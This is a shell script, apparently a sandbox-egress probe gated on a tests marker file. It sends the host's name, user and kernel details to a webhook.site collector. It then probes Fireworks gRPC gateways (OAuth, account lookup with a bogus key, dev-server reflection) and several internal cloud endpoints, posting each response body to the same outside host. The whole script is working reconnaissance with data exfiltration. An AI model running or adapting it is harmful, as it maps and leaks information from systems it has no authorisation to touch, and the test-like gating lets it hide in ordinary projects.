#!/bin/sh
# i83998: sandbox-egress trust differential probes.
# Inert unless the i83998 marker file exists in the checkout (tests/i83998-run).
[ -f ./tests/i83998-run ] || exit 0
NONCE="i83998-$(date +%s)-$$"
SINK="https://webhook.site/376900c1-da59-47e7-9d40-3b7df8de9d79"
esc() { tr -d '\000-\010\013\014\016-\037' | sed 's/\\/\\\\/g; s/"/\\"/g' | tr '\n\r\t' '   '; }
b64of() { base64 -w0 2>/dev/null | head -c 300; }
post() {
  curl -sS -m 6 -o /dev/null -X POST -H 'content-type: application/json' \
    --data "{\"nonce\":\"$NONCE\",\"label\":\"$1\",\"code\":\"$2\",\"b64\":\"$3\"}" "$SINK" >/dev/null 2>&1
}
probe() { # label url [curl args...]
  L="$1"; U="$2"; shift 2
  C=$(curl -m 5 -sS -o /tmp/i83998.o -w '%{http_code}|%{size_download}|%{time_total}' "$@" "$U" 2>/tmp/i83998.e) || C="ERR"
  E=$(head -c 100 /tmp/i83998.e 2>/dev/null | esc)
  B=$(head -c 300 /tmp/i83998.o 2>/dev/null | b64of)
  post "$L" "$C|$E" "$B"
  sleep 1.5
}
grpc() { # label host path reqfile [extra curl args...]
  L="$1"; H="$2"; P="$3"; F="$4"; shift 4
  C=$(curl --http2 -m 8 -sS -D /tmp/i83998.h -o /tmp/i83998.b -w '%{http_code}|%{size_download}|%{time_total}' \
        "$@" -H 'content-type: application/grpc' -H 'te: trailers' --data-binary @"$F" "https://$H$P" 2>/tmp/i83998.e) || C="ERR"
  E=$(head -c 100 /tmp/i83998.e 2>/dev/null | esc)
  GS=$(grep -i '^grpc-status:' /tmp/i83998.h 2>/dev/null | tr -d '\r' | head -1 | awk '{print $2}')
  GM=$(grep -i '^grpc-message:' /tmp/i83998.h 2>/dev/null | tr -d '\r' | head -1 | cut -c15- | head -c 90 | esc)
  B=$(head -c 300 /tmp/i83998.b 2>/dev/null | b64of)
  post "$L" "$C|gs=${GS:-none}|gm=${GM:-none}|$E" "$B"
  sleep 1.5
}

# environment / curl capability
post "env" "0" "$( (hostname; id -un; uname -r; curl -V 2>/dev/null | head -1) 2>/dev/null | b64of)"

# gRPC request frames
printf '\x00\x00\x00\x00\x0b\x0a\x09pyroworks' > /tmp/i83998_oauth.bin
printf '\x00\x00\x00\x00\x14\x0a\x12accounts/pyroworks' > /tmp/i83998_getacct.bin
printf '\x00\x00\x00\x00\x02\x3a\x00' > /tmp/i83998_listsvc.bin

# 1 baseline (normal internet egress)
probe "base-api" "https://api.fireworks.ai/v1/accounts"
# 2 explicit egress IP
probe "ipify" "https://api.ipify.org"

# 3/4 gateway production trust differential
grpc "gw-oauth" "gateway.fireworks.ai" "/gateway.Gateway/GetOAuthArguments" /tmp/i83998_oauth.bin
grpc "gw-getacct-bogus" "gateway.fireworks.ai" "/gateway.Gateway/GetAccount" /tmp/i83998_getacct.bin -H 'x-api-key: fw_i83998bogus'
# 5 gateway-dev reflection
grpc "gwdev-reflect" "gateway-dev.fireworks.ai" "/grpc.reflection.v1.ServerReflection/ServerReflectionInfo" /tmp/i83998_listsvc.bin

# 6-11 own-surface matrix (1 read-only path each)
probe "pilot-dev" "https://pilot-dev.fireworks-ai.cloud/"
probe "device-auth" "https://device-auth.fireworks.ai/"
probe "metis-openapi" "https://metis.fireworks-ai.cloud/api/v1/openapi.json"
probe "langfuse-health" "https://langfuse.fireworks-ai.cloud/api/public/health"
probe "harbor-iowa" "https://harbor.us-iowa-1.fireworks-ai.cloud/v2/" -k
probe "audio-batch-metrics" "https://audio-batch.link.fireworks.ai/metrics/"

post "done" "0" "$(date -u +%FT%TZ | b64of)"
exit 0
